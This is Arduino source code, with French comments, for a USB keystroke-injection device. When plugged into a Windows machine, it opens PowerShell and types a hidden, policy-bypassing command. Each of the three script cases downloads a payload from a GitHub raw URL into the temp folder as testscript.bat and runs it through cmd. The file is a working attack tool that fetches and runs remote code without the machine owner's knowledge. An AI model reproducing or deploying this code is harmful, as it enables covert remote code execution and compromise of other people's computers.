#include <HIDKeyboard.h>
HIDKeyboard keyboard;  // Initialize HIDKeyboard object


uint8_t buf[8] = {
  0
};

bool scriptExecuted = false;

void script(int choix);

void setup() {
  keyboard.begin();  // Start communication
  delay(200);
}

void loop() {
  if (!scriptExecuted) {
    script(1);              // Appeler la fonction script si elle n'a pas été exécutée   //le paramètre choisi le num du script qu'on veux
    scriptExecuted = true;  // Mettre à jour l'indicateur
  }
}

void script(int choix) {

  switch (choix) {
    case 1:
      windterm();
      keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass @(New-Object System.Net.WebClient).DownloadFile(");
      write(1);
      keyboard.print("https://raw.githubusercontent.com/TcLVG/ShadowStrike/Elohyrr-patch-2/script1.txt");
      finprog();
      break;
    case 2:
      windterm();
      keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass @(New-Object System.Net.WebClient).DownloadFile(");
      write(1);
      keyboard.print("https://raw.githubusercontent.com/TcLVG/ShadowStrike/Elohyrr-patch-2/script5.bat");
      finprog();
      break;
    case 3:
      windterm();
      keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass @(New-Object System.Net.WebClient).DownloadFile(");
      write(1);
      keyboard.print("https://raw.githubusercontent.com/TcLVG/ShadowStrike/Elohyrr-patch-2/script7.bat");
      finprog();
      break;
  }
}

void write(int choix) {
  if (choix == 1) {        //pour un '
    buf[2] = 0x34;         // ' key
    Serial.write(buf, 8);  // Send keypress
    keyboard.releaseKey();
  } else if (choix == 2) {  // pour une ,
    buf[2] = 0x36;          // , key
    Serial.write(buf, 8);   // Send keypress
    keyboard.releaseKey();
  } else if (choix == 3) {  //pour un "\"
    buf[2] = 0x64;          // \ key
    Serial.write(buf, 8);   // Send keypress
    keyboard.releaseKey();
  }
}

void windterm() {
  delay(10);
  keyboard.pressSpecialKey(GUI);  // Press the GUI (Windows) key
  keyboard.releaseKey();          // Release the GUI key

  delay(1000);
  keyboard.print("powershell");
  delay(1000);
  keyboard.pressSpecialKey(ENTER);
  delay(100);
  keyboard.releaseKey();
  delay(2500);
}

void finprog() {
  write(1);
  write(2);
  keyboard.pressKey(' ');
  keyboard.releaseKey();
  write(1);
  keyboard.print("$env:temp");
  write(3);
  keyboard.print("testscript.bat");
  write(1);
  keyboard.print("); Start-Process ");
  write(1);
  keyboard.print("cmd");
  write(1);
  keyboard.print(" -ArgumentList ");
  write(1);
  keyboard.print("/c");
  write(1);
  write(2);
  write(1);
  keyboard.print("$env:temp");
  write(3);
  keyboard.print("testscript.bat");
  write(1);
  keyboard.pressKey('@');  // le @ donne un "


  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
}
